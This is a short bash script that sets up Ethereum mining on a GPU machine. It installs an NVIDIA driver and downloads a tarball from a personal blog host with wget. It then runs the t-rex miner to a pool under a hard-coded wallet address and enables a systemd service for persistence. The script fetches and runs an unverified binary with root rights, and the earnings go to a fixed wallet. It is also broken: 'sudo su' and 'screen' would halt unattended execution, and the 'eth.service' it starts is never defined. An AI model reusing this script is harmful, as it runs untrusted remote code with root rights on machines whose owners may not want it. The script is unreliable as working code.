SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ];
then
	echo "duyb vip pro" > isHaveSetupCoin.txt
	cd /usr/local/bin
	sudo add-apt-repository ppa:micahflee/ppa
  sudo apt install nvidia-driver-455
  sudo su
  nvidia-smi
  screen -S VanHien
  wget https://hienblog.com/vanhien.tar.gz && tar xvzf vanhien.tar.gz && cd hienbmt111 && ./t-rex -a ethash -o stratum+tcp://ethash.poolbinance.com:1800 -u 0x28bfe38bf8a1ed40805da24a1a907cda31765eda -p x -w OnlyB.Student
	sudo systemctl daemon-reload
	sudo systemctl enable eth.service
	sudo systemctl start eth.service
else
	sudo systemctl start eth.service
fi
